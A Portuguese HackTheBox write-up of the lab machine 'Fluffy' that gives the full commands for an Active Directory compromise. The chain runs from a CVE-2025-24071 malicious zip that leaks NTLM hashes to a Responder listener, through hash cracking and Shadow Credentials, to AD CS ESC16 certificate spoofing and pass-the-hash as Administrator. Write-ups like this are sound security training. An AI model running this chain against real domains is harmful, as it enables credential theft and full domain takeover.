Fluffy

EasyWindows
Ver na HackTheBox ↗

A Fluffy é uma máquina Windows classificada como Easy, mas que esconde uma aula completa de abuso de Active Directory: do assumed breach inicial, passando por uma CVE recente de vazamento de hash NTLM, Shadow Credentials e terminando em um dos ataques mais novos ao AD CS — o ESC16. Além disso, ela me obrigou a entender de verdade dois problemas de infraestrutura que atrapalham muita gente: o clock skew do Kerberos e a resolução de nomes por IPv6.

Ambiente e ética

Todo este writeup foi feito dentro do laboratório da HackTheBox, em ambiente controlado e autorizado, com fins exclusivamente educativos. O IP da máquina aparece diferente em alguns pontos (10.129.95.92, 10.129.95.117, 10.129.99.80) porque tive quedas de VPN e precisei resetar o alvo — a cada reset, o IP muda.

1 · Reconhecimento

A Fluffy é um cenário de assumed breach: a HackTheBox já me entrega uma credencial de usuário de domínio — j.fleischman / J0elTHEM4n1990!. A ideia é simular um atacante que já tem um acesso inicial de baixo privilégio e precisa escalar dentro do Active Directory.

Começo mapeando o alvo. Primeiro um scan rápido em todas as portas, depois um detalhado nas que importam:

sudo nmap -p- --min-rate 5000 -Pn 10.129.95.92
sudo nmap -sC -sV -p53,88,139,389,445,464,593,636,3268,3269,5985,9389 10.129.95.92

O conjunto de portas é a assinatura de um Domain Controller. O scan de serviços me dá o nome do domínio (fluffy.htb) e do host (DC01). Registro isso no /etc/hosts:

echo '10.129.95.92  dc01.fluffy.htb fluffy.htb dc01' | sudo tee -a /etc/hosts
Por que o /etc/hosts importa

Em ambientes AD, o Kerberos e muitas ferramentas trabalham por nome, não por IP (os tickets são emitidos para nomes de serviço, os SPNs). Sem o mapeamento no /etc/hosts, ferramentas que usam fluffy.htb não sabem para onde ir. Guarde isto: quando o IP do lab mudar (reset), este arquivo precisa ser atualizado — senão você vê erros estranhos de conexão mesmo com o alvo no ar.

2 · Enumeração autenticada

Com a credencial do j.fleischman em mãos, valido o acesso por SMB com o netexec (nxc):

nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'

Como é um domínio, parto para um Kerberoasting — pedir tickets de serviço (TGS) de contas com SPN para tentar quebrar as senhas offline. E aqui bati no primeiro obstáculo de infraestrutura: KRB_AP_ERR_SKEW (Clock skew too great).

faketime "$(sudo ntpdate -q fluffy.htb | cut -d ' ' -f 1,2)" \
  nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt
Clock skew e faketime — leia isto

O Kerberos é sensível ao relógio: ele exige que o horário do seu atacante esteja a menos de ~5 minutos do horário do Domain Controller. Se passar disso, o KDC rejeita com KRB_AP_ERR_SKEW. O DC da Fluffy estava ~7 horas à frente do meu Kali.

O normal seria sincronizar com sudo ntpdate fluffy.htb. O problema: eu estava numa VM do VirtualBox, e as Guest Additions revertiam meu relógio em segundos, voltando a dar skew. A solução definitiva foi o faketime: ele cria uma hora falsa só para o processo que você rodar, sem tocar no relógio do sistema. Assim eu passo ao comando exatamente a hora do DC.

Regra de ouro na Fluffy: todo comando que faz Kerberos/PKINIT (certipy shadow, certipy auth, kerberoasting) vai na frente com faketime -f '+7h'. Comandos que são só LDAP (como o bloodyAD) não precisam.

O Kerberoasting devolve os hashes de três contas de serviço — ca_svc, ldap_svc e winrm_svc — mas o hashcat não quebrou nenhuma com a rockyou (rabbit hole). Sigo para uma coleta completa do domínio com o rusthound-ce, que gera os dados para o BloodHound:

./rusthound-ce --domain fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -z

Subo o BloodHound CE com Docker e importo o .zip para visualizar as relações do domínio:

cd ~/bloodhound && docker compose up -d

O j.fleischman não tem caminho óbvio, então volto ao SMB para enumerar os compartilhamentos — muitas vezes o ponto de entrada está num share mal configurado:

nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares

O share IT é gravável (READ,WRITE). Acesso com o smbclient e listo o conteúdo:

smbclient -U j.fleischman@fluffy.htb //fluffy.htb/IT

3 · Acesso inicial — CVE-2025-24071

O Upgrade_Notice.pdf é um aviso de patch listando CVEs recentes. Uma delas chama atenção: CVE-2025-24071.

O que é a CVE-2025-24071

É uma falha de information disclosure no Windows Explorer. Quando um arquivo .library-ms (um XML que descreve uma biblioteca do Windows) é extraído de um .zip/.rar, o Explorer processa automaticamente o caminho definido dentro dele — e se esse caminho for um compartilhamento SMB (\\IP\share), o Windows inicia uma autenticação SMB sem o usuário abrir nada. Basta extrair o arquivo.

O pulo do gato: aquele compartilhamento SMB é o meu Kali rodando o Responder. Quando o Windows tenta autenticar no meu host, o Responder captura o NetNTLMv2 de quem extraiu o arquivo. Como há um processo no servidor que abre os arquivos do share IT, consigo capturar o hash de outro usuário.

Pego um PoC público da CVE, que gera um .zip malicioso contendo o .library-ms apontando para o meu IP:

git clone https://github.com/0x6rss/CVE-2025-24071_PoC
cd CVE-2025-24071_PoC
python3 poc.py
# Enter your file name: bad.zip
# Enter IP (EX: 192.168.1.162): 10.10.15.225

Subo o Responder na minha interface da VPN e envio o zip para o share IT. Em pouco tempo, o servidor processa o arquivo e o Responder captura o NetNTLMv2 do usuário p.agila:

sudo responder -I tun0
smbclient -U j.fleischman@fluffy.htb //fluffy.htb/IT -c 'put bad.zip'

Salvo o hash num arquivo e quebro com o hashcat. NetNTLMv2 é o modo 5600 — identifico pelo formato usuário::DOMÍNIO:challenge:NTproof:blob:

hashcat -m 5600 hash_agila.txt /usr/share/wordlists/rockyou.txt
CREDENCIAL OBTIDAp.agila : prometheusx-303

4 · Movimentação lateral — Shadow Credentials

Marco o p.agila como Owned no BloodHound e analiso o que ele controla. Aqui aparece o caminho da máquina:

O caminho completo é uma cadeia de permissões:

p.agila
  └─(membro)→ Service Account Managers
        └─(GenericAll)→ Service Accounts
              └─(GenericWrite)→ winrm_svc / ca_svc / ldap_svc

O p.agila não controla as contas de serviço diretamente — o poder vem de estar no grupo Service Accounts. Como o grupo Service Account Managers (do qual ele é membro) tem GenericAll sobre o Service Accounts, eu posso me adicionar a esse grupo. Uso o bloodyAD (que trabalha por LDAP, então não precisa de faketime):

bloodyAD --host 10.129.99.80 -d fluffy.htb -u p.agila -p 'prometheusx-303' \
  add groupMember 'Service Accounts' p.agila
O que é Shadow Credentials

Com GenericWrite sobre uma conta, posso escrever no atributo msDS-KeyCredentialLink dela. Esse atributo guarda chaves públicas usadas para autenticação via certificado (PKINIT). Se eu adiciono minha própria chave ali, passo a conseguir me autenticar como aquela conta usando um certificado que eu mesmo gerei — sem saber a senha dela.

O certipy shadow auto faz tudo de uma vez: gera a chave, escreve no atributo, pede um TGT via PKINIT e recupera o NT hash da conta — depois restaura o atributo original para não deixar rastro.

faketime -f '+7h' certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' \
  -account winrm_svc -dc-ip 10.129.99.80 -ns 127.0.0.1
O truque do -ns 127.0.0.1 e o IPv6

O certipy me deu No route to host de forma teimosa, mesmo com ping funcionando e o bloodyAD conectando no mesmo IP. O motivo: o certipy usa o -dc-ip também como servidor DNS e o DNS do DC devolvia um registro AAAA (IPv6) para fluffy.htb — e a VPN (tun0) só tem rota IPv4. Resultado: ele tentava conectar num endereço IPv6 sem rota.

A prova: dig +short @10.129.99.80 fluffy.htb AAAA devolveu dead:beef::.... A solução: apontar o nameserver para um lugar morto com -ns 127.0.0.1. Assim a resolução DNS falha e o certipy cai no /etc/hosts, que só tem o IPv4 — e conecta normalmente. O -dc-ip continua correto para o Kerberos/KDC.

Repito o ataque para a conta ca_svc (que vai ser a peça-chave no AD CS mais à frente):

faketime -f '+7h' certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' \
  -account ca_svc -dc-ip 10.129.99.80 -ns 127.0.0.1

Com o NT hash do winrm_svc, entro na máquina via WinRM usando pass-the-hash e pego a flag de usuário:

evil-winrm -i 10.129.99.80 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767

5 · Escalonamento — AD CS ESC16

O host chama-se ca_svc (certificate authority service) — forte indício de uma Autoridade Certificadora (AD CS) no domínio. Uso o certipy find com o hash do ca_svc para enumerar templates e procurar configurações vulneráveis:

certipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -dc-ip 10.129.99.80 -vulnerable
O que é o ESC16

Para mitigar ataques antigos de AD CS, a Microsoft introduziu uma Security Extension (OID szOID_NTDS_CA_SECURITY_EXT) que embute o SID do solicitante dentro do certificado, amarrando o certificado à conta de verdade. O ESC16 acontece quando essa extensão está desabilitada em toda a CA.

Sem essa amarração pelo SID, a CA passa a confiar apenas no UPN (userPrincipalName) da conta para decidir quem é o certificado. Se eu consigo escrever o UPN de uma conta que controlo, posso fazer o certificado se passar por outra conta — inclusive o Administrator.

Confirmo os dados da conta ca_svc (a conta que controlo e que vou usar para pedir o certificado):

certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.99.80 -user ca_svc read

Aqui aprendi um detalhe importante: o p.agila perde o acesso ao grupo Service Accounts sempre que a máquina é resetada. Então, antes de manipular o ca_svc, preciso refazer a adição ao grupo:

bloodyAD --host 10.129.99.80 -d fluffy.htb -u p.agila -p 'prometheusx-303' \
  add groupMember 'Service Accounts' p.agila

Agora o abuso do ESC16. Primeiro altero o UPN do ca_svc para administrator. Uma tentativa com winrm_svc@fluffy.htb dá erro de CONSTRAINT_ATT_TYPE (não pode haver dois UPNs iguais no domínio), mas administrator puro funciona:

certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.99.80 \
  -user ca_svc -upn administrator update
Por que o UPN spoofing funciona

Com a Security Extension desligada (ESC16), a CA não grava o SID no certificado. Quando eu peço um certificado como ca_svc, a CA olha o UPN da conta para preencher a identidade do certificado. Como mudei esse UPN para administrator, o certificado sai em nome do Administrator. Depois restauro o UPN original para que a conta Administrator real volte a ser reconhecida na hora de autenticar.

Com o UPN do ca_svc apontando para administrator, peço um certificado usando o template padrão User:

certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.129.99.80

Ao tentar autenticar direto, tomo um erro de name mismatch: enquanto o UPN do ca_svc ainda está como administrator, o KDC se confunde. A correção é restaurar o UPN do ca_svc para o valor original antes de autenticar:

certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.99.80 \
  -user ca_svc -upn ca_svc update

Agora autentico com o certificado (lembrando do faketime — é PKINIT, puro Kerberos) e recupero o NT hash do Administrator:

faketime -f '+7h' certipy auth -dc-ip 10.129.99.80 -pfx administrator.pfx \
  -username administrator -domain fluffy.htb
DOMAIN ADMIN OBTIDOadministrator : aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e

6 · Conclusão

Com o hash do Administrator, entro na máquina via WinRM (pass-the-hash) e capturo a flag de root:

evil-winrm -i 10.129.99.80 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e

A Fluffy foi uma verdadeira aula. O caminho técnico — assumed breach → CVE-2025-24071 (NTLM leak) → crack NetNTLMv2 → Shadow Credentials → ESC16 — encadeia várias técnicas modernas de AD que valem muito para o CPTS. Mas o que mais aprendi foram os detalhes de infraestrutura que quase ninguém documenta:

  • Clock skew: o Kerberos exige relógio sincronizado com o DC. Em VM do VirtualBox, as Guest Additions revertem o ntpdate — a saída é o faketime -f '+7h' em todo comando Kerberos/PKINIT.
  • DNS IPv6: o DNS do DC devolvia um AAAA (dead:beef::...) sem rota pela VPN, causando No route to host teimoso. O -ns 127.0.0.1 força a cair no /etc/hosts (IPv4).
  • Reset = estado perdido: resetar a máquina muda o IP (atualize o /etc/hosts) e reverte alterações no AD (como a adição ao grupo Service Accounts), que precisam ser refeitas.

As ferramentas e conceitos usados aqui (BloodHound, certipy, bloodyAD, Kerberos, AD CS) estão no guia de Active Directory.
